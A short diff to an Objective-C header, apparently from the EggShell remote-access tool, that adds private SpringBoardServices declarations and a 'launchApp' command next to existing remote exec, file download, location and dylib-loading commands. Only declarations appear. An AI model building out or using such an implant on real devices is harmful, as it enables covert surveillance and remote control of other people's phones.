@@ -50,6 +50,8 @@ extern int sockfd;
 -(void)download:(NSArray *)args;
 
 //misc
+extern int SBSLaunchApplicationWithIdentifier(CFStringRef identifier, Boolean suspended);
+extern CFStringRef SBSApplicationLaunchingErrorString(int error);
 -(void)locate;
 -(void)exec:(NSString *)command;
 -(void)receiveDYLIB;
@@ -63,6 +65,7 @@ extern int sockfd;
 -(void)getVolume;
 -(void)isplaying;
 -(void)listapps;
+-(void)launchApp:(NSArray *)args;
 
 //eggshell pro
 -(void)mcSendNoReply:(NSString *)message;
